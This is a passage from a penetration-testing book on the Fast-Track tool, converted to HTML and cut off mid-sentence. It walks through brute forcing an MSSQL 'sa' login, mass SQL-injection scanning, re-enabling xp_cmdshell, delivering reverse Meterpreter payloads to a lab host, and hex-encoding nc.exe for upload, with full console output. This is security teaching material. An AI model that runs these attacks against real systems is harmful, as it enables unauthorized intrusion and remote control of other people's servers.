3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Here’s the initial attack:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_461.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Microsoft SQL Attack Tools</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Pick a list of the tools from below:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l34"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">MSSQL Injector</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">MSSQL Bruter</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">SQLPwnage</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice : <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 98pt;text-indent: 0pt;text-align: left;">Enter the IP Address and Port Number to Attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 137pt;text-indent: -38pt;text-align: left;">Options: (a)ttempt SQL Ping and Auto Quick Brute Force (m)ass scan and dictionary brute</p><p class="s25" style="padding-left: 137pt;text-indent: 0pt;text-align: left;">(s)ingle Target (Attack a Single Target with big dictionary) (f)ind SQL Ports (SQL Ping)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 137pt;text-indent: 0pt;text-align: left;">(i) want a command prompt and know which system is vulnerable (v)ulnerable system, I want to add a local admin on the box... (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_462.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">After we select the <span class="s25">MSSQL Bruter </span>option, Fast-Track presents us with a list of various attacks that can be conducted. Not all of these will work in every situation, or even serve the same purpose, so it is important to be sure that you understand what is happening for each option.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Fast-Track has several options:</p><ul id="l35"><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Attempt SQL Ping and Auto Quick Brute Force attempts to scan a range of IP addresses using the same syntax as <span class="s19">nmap </span>and a built-in predefined dictionary list of about 50 passwords.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Mass scan and dictionary brute scans a range of IP addresses and allows you to specify a word list of your own. Fast-Track comes with a decent word list located at <span class="s19">bin/dict/wordlist.txt</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Single Target allows you to brute force one specific IP address with a large word list.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Find SQL Ports (SQL Ping) only looks for SQL servers and will not attack them.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">I want a command prompt . . . spawns a command prompt for you if you already know the <span class="s19">sa </span>password.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Vulnerable system . . . adds a new administrative user on a box that you know to be vulnerable.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Enable <span class="s25">xp_cmdshell </span>. . . is a stored procedure Fast-Track uses to execute underlying system commands. By default, it is disabled in SQL Server versions 2005 and later, but Fast-Track can automatically re-enable it. When attacking a remote system with any option, Fast-Track will auto- matically attempt to re-enable <span class="s25">xp_cmdshell</span>, just in case.</p></li></ul><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You can use and customize several options to reach your target, the easi- est of which is the quick brute force, which will often go undetected. We’ll select the quick brute force option using a subset of built-in passwords and attempt to guess the password on the MS SQL server.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_463.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter the IP Address and Port Number to Attack.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 137pt;text-indent: -59pt;line-height: 80%;text-align: left;">O <span class="s25">Options: (a)ttempt SQL Ping and Auto Quick Brute Force (m)ass scan and dictionary brute</span></p><p class="s25" style="padding-left: 137pt;text-indent: 0pt;text-align: left;">(s)ingle Target (Attack a Single Target with big dictionary) (f)ind SQL Ports (SQL Ping)</p><p class="s25" style="padding-left: 137pt;text-indent: 0pt;text-align: left;">(i) want a command prompt and know which system is vulnerable (v)ulnerable system, I want to add a local admin on the box... (e)nable xp_cmdshell if its disabled (sql2k and sql2k5)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 98pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Enter Option: <span class="s24">a</span></p><p class="s25" style="padding-left: 90pt;text-indent: -12pt;line-height: 88%;text-align: left;"><span class="s30">8 </span>Enter username for SQL database (example:sa): <span class="s24">sa </span>Configuration file not detected, running default path. Recommend running setup.py install to configure Fast-Track.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Setting default directory...</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@ <span class="s25">Enter the IP Range to scan for SQL Scan (example 192.168.1.1-255):</span></p><p class="s24" style="padding-left: 111pt;text-indent: 0pt;line-height: 9pt;text-align: left;">10.211.55.1/24</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 87%;text-align: left;">Do you want to perform advanced SQL server identification on non-standard SQL ports? This will use UDP footprinting in order to determine where the SQL servers are at. This could take quite a long time.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">O <span class="s25">Do you want to perform advanced identification, yes or no: </span><span class="s24">yes</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[-] Launching SQL Ping, this may take a while to footprint. [-]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Please wait while we load the module tree...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Brute forcing username: sa</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Be patient this could take awhile...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Brute forcing password of password2 on IP 10.211.55.128:1433 Brute forcing password of on IP 10.211.55.128:1433</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Brute forcing password of password on IP 10.211.55.128:1433</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 87%;text-align: left;">SQL Server Compromised: &quot;sa&quot; with password of: &quot;password&quot; on IP 10.211.55.128:1433</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Brute forcing password of sqlserver on IP 10.211.55.128:1433 Brute forcing password of sql on IP 10.211.55.128:1433</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Brute forcing password of password1 on IP 10.211.55.128:1433 Brute forcing password of password123 on IP 10.211.55.128:1433</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Brute forcing password of complexpassword on IP 10.211.55.128:1433 Brute forcing password of database on IP 10.211.55.128:1433</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Brute forcing password of server on IP 10.211.55.128:1433 Brute forcing password of changeme on IP 10.211.55.128:1433 Brute forcing password of change on IP 10.211.55.128:1433</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Brute forcing password of sqlserver2000 on IP 10.211.55.128:1433 Brute forcing password of sqlserver2005 on IP 10.211.55.128:1433</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Brute forcing password of Sqlserver on IP 10.211.55.128:1433 Brute forcing password of SqlServer on IP 10.211.55.128:1433 Brute forcing password of Password1 on IP 10.211.55.128:1433</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">******************************************* The following SQL Servers were compromised:</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">*******************************************</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">1. 10.211.55.128:1433 *** U/N: sa P/W: password ***</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">*******************************************</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">To interact with system, enter the SQL Server number. Example: 1. 192.168.1.32 you would type 1</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter the number:</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_464.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: justify;">After selecting Attempt SQL Ping and Auto Quick Brute Force at <span class="s32">O</span>, you will be prompted for a SQL database username <span class="s32">8</span>, followed by the range of IP addresses you want to scan at <span class="s32">@</span>. Answer <span class="s24">yes </span>when asked whether you want to perform advanced server identification <span class="s32">O</span>. Although slow, this can be very effective.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">The preceding output shows that Fast-Track successfully brute forced a system with the username of <span class="s19">sa </span>and password <span class="s19">password</span>. At this point, you can select the payload and compromise the system, as shown here.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_465.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter number here: <span class="s24">1</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enabling: XP_Cmdshell...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Finished trying to re-enable xp_cmdshell stored procedure if disabled.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Configuration file not detected, running default path. Recommend running setup.py install to configure Fast-Track. Setting default directory...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">What port do you want the payload to connect to you on: <span class="s24">4444</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit Reverse Meterpreter Upload Detected.. Launching Meterpreter Handler.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Creating Metasploit Reverse Meterpreter Payload.. Sending payload: c88f3f9ac4bbe0e66da147e0f96efd48dad6 Sending payload: ac8cbc47714aaeed2672d69e251cee3dfbad Metasploit payload delivered..</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Converting our payload to binary, this may take a few... Cleaning up...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Launching payload, this could take up to a minute...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 87%;text-align: left;">When finished, close the metasploit handler window to return to other compromised SQL Servers.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Please wait while we load the module tree... [*] Handler binding to LHOST 0.0.0.0</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Started reverse handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting the payload handler...</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Transmitting intermediate stager for over-sized stage...(216 bytes) [*] Sending stage (718336 bytes)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 1 opened (10.211.55.130:4444 -&gt; 10.211.55.128:1030)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_466.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You should now have full access to the machine using the Meterpreter payload.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark330">SQLPwnage</a><a name="bookmark341">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><span class="s19">SQLPwnage </span>is a mass brute force attack that can be used against web applica- tions in an attempt to find Microsoft SQL injection. SQLPwnage will scan subnets for web servers on port 80, crawl websites, and attempt to fuzz post parameters until it finds SQL injection. It supports both error- and blind- based SQL injection and will handle everything from privilege escalation to re-enabling the <span class="s25">xp_cmdshell </span>stored procedure, bypassing the Windows debug 64KB restriction, and dropping any payload you want onto the system.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Begin the configuration for this attack by selecting <span class="s25">Microsoft SQL Tools </span>from the Fast-Track main menu, followed by <span class="s25">SQLPwnage</span>, option 2, as shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_467.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">SQLPwnage Main Menu:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l36"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 10pt;text-align: left;">SQL Injection Search/Exploit by Binary Payload Injection (BLIND)</p></li></ol><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">2. SQL Injection Search/Exploit by Binary Payload Injection (ERROR BASED)</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">3. SQL Injection single URL exploitation</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice: <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Scan a subnet or spider single URL?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1. url</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8 <span class="s25">2. subnet (new)</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">3. subnet (lists last scan)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter the Number: <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter the ip range, example 192.168.1.1-254: <span class="s24">10.211.55.1-254</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Scanning Complete!!! Select a website to spider or spider all??</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1. Single Website</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@ <span class="s25">2. All Websites</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter the Number: <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://10.211.55.128/" class="s34" target="_blank">Attempting to Spider: http://10.211.55.128 Crawling </a>http://10.211.55.128 (Max Depth: 100000) DONE</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Found 0 links, following 0 urls in 0+0:0:0</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Spidering is complete.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://10.211.55.128/" class="s34" target="_blank">************************************************************************* http://10.211.55.128</a></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">************************************************************************* [+] Number of forms detected: 2 [+]</p><p class="s30" style="padding-bottom: 4pt;padding-left: 111pt;text-indent: -33pt;line-height: 73%;text-align: left;">O <span class="s25">A SQL Exception has been encountered in the &quot;txtLogin&quot; input field of the above website.</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_468.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: left;">Depending on whether the website presents an error when SQL injec- tion attempts are made, you will need to choose between <span class="s25">BLIND </span>and <span class="s25">ERROR BASED </span>attacks. At <span class="s32">O </span>we choose <span class="s25">ERROR BASED </span>because the site is kind enough</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 8pt;text-align: left;">to report back error messages when it has trouble executing a SQL query.</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: justify;">Next, choose either to spider a single URL or to scan a complete subnet <span class="s32">8</span>. After scanning the subnet, we choose to attack all the sites Fast-Track found <span class="s32">@</span>. As you can see, scanning all the sites found a vulnerable form <span class="s32">O </span>on one site.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">The final configuration steps require that you select a payload. In the</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 82%;text-align: left;">following example, you select <span class="s25">Metasploit Meterpreter Reflective Reverse TCP </span><span class="s32">O </span>along with the port at <span class="s32">8 </span>that you want your attacking machine to listen on. After Fast-Track has successfully exploited the SQL injection vulnerabil-</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 69%;text-align: left;">ity, it sends a chunked payload <span class="s32">@ </span>to the target and eventually presents you with your Meterpreter shell <span class="s32">O</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_469.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">What type of payload do you want?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l37"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Custom Packed Fast-Track Reverse Payload (AV Safe)</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Metasploit Reverse VNC Inject (Requires Metasploit)</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Metasploit Meterpreter Payload (Requires Metasploit)</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Metasploit TCP Bind Shell (Requires Metasploit)</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Metasploit Meterpreter Reflective Reverse TCP</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Metasploit Reflective Reverse VNC</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O <span class="s25">Select your choice: </span><span class="s24">5</span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">8 <span class="s25">Enter the port you want to listen on: </span><span class="s24">9090</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[+] Importing 64kb debug bypass payload into Fast-Track... [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[+] Import complete, formatting the payload for delivery.. [+] [+] Payload Formatting prepped and ready for launch. [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[+] Executing SQL commands to elevate account permissions. [+] [+] Initiating stored procedure: &#39;xp_cmdhshell&#39; if disabled. [+] [+] Delivery Complete. [+]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Created by msfpayload (http://www.metasploit.com). Payload: windows/patchupmeterpreter/reverse_tcp Length: 310</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Options: LHOST=10.211.55.130,LPORT=9090</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Launching MSFCLI Meterpreter Handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Creating Metasploit Reverse Meterpreter Payload.. Taking raw binary and converting to hex.</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Raw binary converted to straight hex.</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@ <span class="s25">[+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]</span></p><p class="s24" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Running cleanup before launching the payload....</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+] [*] Please wait while we load the module tree...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Handler binding to LHOST 0.0.0.0 [*] Started reverse handler</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Starting the payload handler...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Transmitting intermediate stager for over-sized stage...(216 bytes) [*] Sending stage (2650 bytes)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sleeping before handling stage...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Uploading DLL (718347 bytes)...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Upload completed.</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">[*] Meterpreter session 1 opened (10.211.55.130:9090 -&gt; 10.211.55.128:1031)</span></p><p class="s25" style="padding-top: 7pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_470.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark331">Binary-to-Hex Generator</a><a name="bookmark342">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The binary-to-hex generator is useful when you already have access to a sys- tem and you want to deliver an executable to the remote file system. Point Fast-Track to the executable, and it will generate a text file that you can copy</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 84%;text-align: left;">and paste to the target operating system. To convert the hexadecimal back to a binary and execute it, choose option 6 as shown at <span class="s32">O </span>below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_471.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">Enter the number: </span><span class="s24">6</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Binary to Hex Generator v0.1</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 75%;text-align: left;">8 <span class="s25">Enter the path to the file you want to convert to hex: </span><span class="s24">/pentest/exploits/ fasttrack/nc.exe</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Finished...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Opening text editor...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">// Output will look like this</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@ <span class="s25">DEL T 1&gt;NUL 2&gt;NUL</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">echo EDS:0 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00&gt;&gt;T</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">echo EDS:10 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00&gt;&gt;T echo FDS:20 L 10 00&gt;&gt;T</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">echo EDS:30 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00&gt;&gt;T</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">echo EDS:40 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68&gt;&gt;T</p><p class="s25" style="padding-left: 31pt;text-indent: 0pt;line-height: 11pt;text-align: center;">echo EDS:50 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F&gt;&gt;T</p><p class="s25" style="padding-left: 31pt;text-indent: 0pt;line-height: 11pt;text-align: center;">echo EDS:60 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20&gt;&gt;T</p><p class="s25" style="padding-bottom: 3pt;padding-left: 31pt;text-indent: 0pt;line-height: 11pt;text-align: center;">echo EDS:70 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00&gt;&gt;T</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_472.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: justify;">After selecting the <span class="s25">Binary to Hex Payload Converter</span>, point Fast-Track to the binary you want to convert at <span class="s32">8 </span>and wait for the magic. At this point, you can simply copy and paste the output from <span class="s32">@ </span>into an existing shell window.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark332">Mass Client-Side Attack</a><a name="bookmark343">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">The <span class="s19">mass client-side attack </span>is similar to the <span class="s19">Browser Autopwn </span>function; however, this attack includes additional exploits and built-in features that can incorpo- rate ARP cache and DNS poisoning on the target’s machine, and additional browser exploits not included in Metasploit.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When a user connects to your web server, Fast-Track will fire off every exploit in its arsenal as well as those in the Metasploit Framework. If the user’s machine is susceptible to a 